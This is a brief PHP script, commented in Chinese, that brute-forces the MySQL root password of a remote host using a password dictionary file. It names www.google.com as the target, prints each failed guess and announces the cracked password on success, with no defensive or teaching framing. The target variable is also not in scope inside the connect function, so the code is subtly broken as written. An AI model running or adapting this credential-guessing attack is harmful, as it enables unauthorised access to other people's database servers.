<?
set_time_limit(0);                                   //腳本不超時

$ip = "www.google.com";                                   //IP
$user = "root";                                      //用戶名
$passwd = file("password.txt");                      //密碼字典

for($i=0; $i<count($passwd); $i++){
    $pass = Str_Replace("\r\n", "", $passwd[$i]);   //刪除多餘的Enter和換行
    connect($user, $pass);
    flush();
}
echo "掃描結束！";

function connect($user, $pass) {
    if(@mysql_connect($ip, $user, $pass)){
        echo "<font color='#0000FF'><b>得到密碼：<font color='#FF0000'>".$pass."</font>！！！</b></font>";
        exit();
    }
    else {
        echo $pass.'<br>';
    }
}
?>